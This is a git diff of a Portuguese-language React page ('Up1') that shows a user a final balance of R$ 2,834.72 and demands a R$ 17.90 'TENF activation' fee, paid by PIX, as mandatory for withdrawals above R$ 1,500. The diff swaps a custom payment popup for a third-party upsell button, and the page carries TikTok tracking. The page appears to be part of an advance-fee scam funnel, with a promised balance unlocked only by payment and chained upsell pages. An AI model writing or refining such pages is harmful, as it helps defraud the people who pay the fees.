@@ -1,15 +1,10 @@
-import { useState, useEffect } from 'react';
-import { useNavigate } from 'react-router-dom';
-import ParadisePixPopup from '@/components/ParadisePixPopup';
+import { useEffect } from 'react';
 import PageTransition from '@/components/PageTransition';
 import { trackViewContent } from '@/lib/tiktokPixel';
-import { useCustomerData } from '@/hooks/useCustomerData';
 import '../styles/app.css';
 
 const SALDO_FINAL = 2834.72;
 const TAXA_TENF = 17.90;
-const TAXA_TENF_CENTAVOS = 1790;
-const PRODUCT_HASH = 'prod_0a240a2e87de20da';
 
 const formatBR = (value: number) => {
   return value
@@ -19,18 +14,9 @@ const formatBR = (value: number) => {
 };
 
 const Up1 = () => {
-  const navigate = useNavigate();
-  const [showPixPopup, setShowPixPopup] = useState(false);
-  const { customer } = useCustomerData();
-
   useEffect(() => {
     trackViewContent('Ativação TENF', TAXA_TENF);
   }, []);
-
-  const handlePaymentSuccess = () => {
-    setShowPixPopup(false);
-    navigate('/up2');
-  };
 
   return (
     <PageTransition>
@@ -82,27 +68,33 @@ const Up1 = () => {
           </div>
 
           <button
-            onClick={() => setShowPixPopup(true)}
-            className="cta-button cta-primary"
+            className="paradise-upsell-btn"
+            style={{
+              backgroundColor: '#28a745',
+              color: '#ffffff',
+              padding: '12px 20px',
+              border: 'none',
+              borderRadius: '6px',
+              fontSize: '16px',
+              fontWeight: 'bold',
+              cursor: 'pointer',
+              width: '100%',
+            }}
+            data-offer-hash="upsell_641f662b70e65456"
+            data-modal-title="Ativação TENF"
+            data-copy-button-text="Copiar Código PIX"
+            data-modal-bg="#ffffff"
+            data-modal-title-color="#1f2937"
+            data-modal-btn-color="#28a745"
+            data-modal-btn-text-color="#ffffff"
           >
-            Ativar TENF obrigatório
+            Sim, eu quero esta oferta!
           </button>
 
           <p className="cta-footnote">
             A ativação é obrigatória para saques acima de R$ 1.500
           </p>
         </div>
-
-        {showPixPopup && (
-          <ParadisePixPopup
-            amount={TAXA_TENF_CENTAVOS}
-            description="Ativação TENF obrigatório"
-            productHash={PRODUCT_HASH}
-            customer={customer}
-            onSuccess={handlePaymentSuccess}
-            onClose={() => setShowPixPopup(false)}
-          />
-        )}
       </main>
     </PageTransition>
   );
